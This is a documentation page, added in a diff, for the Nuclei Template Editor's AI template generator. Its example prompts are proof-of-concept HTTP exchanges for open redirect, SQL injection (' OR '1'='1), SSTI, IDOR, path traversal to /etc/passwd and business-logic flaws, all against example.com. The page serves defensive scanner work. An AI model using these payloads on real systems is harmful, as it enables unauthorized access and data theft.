@@ -1,0 +1,265 @@
+---
+
+title: 'AI Assistance'
+
+---
+
+<img src="/images/ai.jpg" alt="AI Prompt" width="800px"/>
+
+[Nuclei Template Editor](https://templates.nuclei.sh/) has AI to generate templates for vulnerability reports. This document helps to guide you through the process, offering you usage tips and examples.
+
+## Overview
+
+Powered by public Nuclei templates and a rich CVE data set, the AI understands a broad array of security vulnerabilities. First, the system interprets the user's prompt to identify a specific vulnerability. Then, it generates a template based on the steps required to reproduce the vulnerability along with all the necessary meta information to reproduce and remediate.
+
+---
+
+## Initial Setup
+
+Kick start your AI Assistance experience with these steps:
+
+1.  **Provide Detailed Information**: Construct comprehensive Proof of Concepts (PoCs) for vulnerabilities like Cross-Site Scripting (XSS), and others.
+2.  **Understand the Template Format**: Get to grips with the format to appropriately handle and modify the generated template.
+3.  **Validation and Linting**: Utilize the integrated linter to guarantee the template's validity.
+4.  **Test the Template**: Evaluate the template against a test target ensuring its accuracy.
+
+
+---
+
+## Best Practices
+
+*   **Precision Matters**: Detailed prompts yield superior templates.
+*   **Review and Validate**: Consistently check matchers' accuracy.
+*   **Template Verification**: Validate the template on known vulnerable targets before deployment.
+---
+
+## Example Prompts
+
+The following examples demonstrate different vulnerabilities and the corresponding Prompt.
+
+<Accordion title="Vulnerability: Open Redirect">
+
+Open redirect vulnerability identified in a web application. Here's the PoC:
+
+HTTP Request:
+
+```
+GET /redirect?url=http://malicious.com HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+```
+HTTP Response:
+
+```
+HTTP/1.1 302 Found
+Location: http://malicious.com
+Content-Length: 0
+Server: Apache
+```
+The application redirects the user to the URL specified in the url parameter, leading to an open redirect vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: SQL Injection">
+
+SQL Injection vulnerability in a login form. Here's the PoC:
+
+HTTP Request:
+
+```
+POST /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=' OR '1'='1
+```
+
+HTTP Response:
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1337
+Server: Apache
+
+<html>
+...
+<p>Welcome back, admin</p>
+...
+</html>
+```
+
+The application improperly handles user input in the password field, leading to an SQL Injection vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: Business logic (negative cart balance)">
+
+Business Logic vulnerability in a web application's shopping cart function allows for negative quantities, leading to credit. Here's the PoC:
+
+HTTP Request:
+
+```
+POST /add-to-cart HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+product_id=1001&quantity=-1
+```
+
+HTTP Response:
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1337
+Server: Apache
+
+<html>
+...
+<p>Product added to cart. Current balance: -$19.99</p>
+...
+</html>
+```
+
+The application fails to validate the quantity parameter, resulting in a Business Logic vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: Server-side Template Injection (SSTI)">
+
+Server-side Template Injection (SSTI) vulnerability through a web application's custom greeting card function. Here's the PoC:
+
+```
+HTTP Request:
+
+POST /create-card HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+message={{7*7}}
+```
+
+```
+HTTP Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1337
+Server: Apache
+
+<html>
+...
+<p>Your card: 49</p>
+...
+</html>
+```
+
+The application processes the message parameter as a template, leading to an SSTI vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: Insecure Direct Object Reference (IDOR)">
+
+Insecure Direct Object Reference (IDOR) vulnerability discovered in a website's user profile page. Here's the PoC:
+
+```
+HTTP Request:
+
+GET /profile?id=2 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Cookie: session=abcd1234
+```
+
+```
+HTTP Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1337
+Server: Apache
+
+<html>
+...
+<p>Welcome, otheruser</p>
+...
+</html>
+```
+
+The application exposes sensitive information of a user (ID: 2) who is not the authenticated user (session: abcd1234), leading to an IDOR vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: Path Traversal">
+
+Path Traversal vulnerability identified in a web application's file download function. Here's the PoC:
+
+```
+HTTP Request:
+
+GET /download?file=../../etc/passwd HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+```
+
+```
+HTTP Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 1827
+Server: Apache
+
+root:x:0:0:root:/root:/bin/bash
+```
+
+The application fetches the file specified in the file parameter from the server file system, leading to a Path Traversal vulnerability.
+
+</Accordion>
+
+<Accordion title="Vulnerability: Business logic (extend VIP subscription)">
+
+Business logic vulnerability in a web application's VIP subscription function allows users to extend the trial period indefinitely. Here's the PoC:
+
+```
+HTTP Request:
+
+POST /extend-trial HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Cookie: session=abcd1234
+```
+
+```
+HTTP Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1337
+Server: Apache
+
+<html>
+
+<p>Your VIP trial period has been extended by 7 days.</p>
+
+</html>
+```
+
+The application does not limit the number of times the trial period can be extended, leading to a business logic vulnerability.
+
+</Accordion>
+
+Each of these examples provides HTTP Requests and Responses to illustrate the vulnerabilities.
+
+
+---
+
+## Limitations
+
+Please note that the current AI is trained primarily on HTTP data. Template generation for non-HTTP protocols is not supported at this time. Support for additional protocols is under development and will be available soon.
+
+---
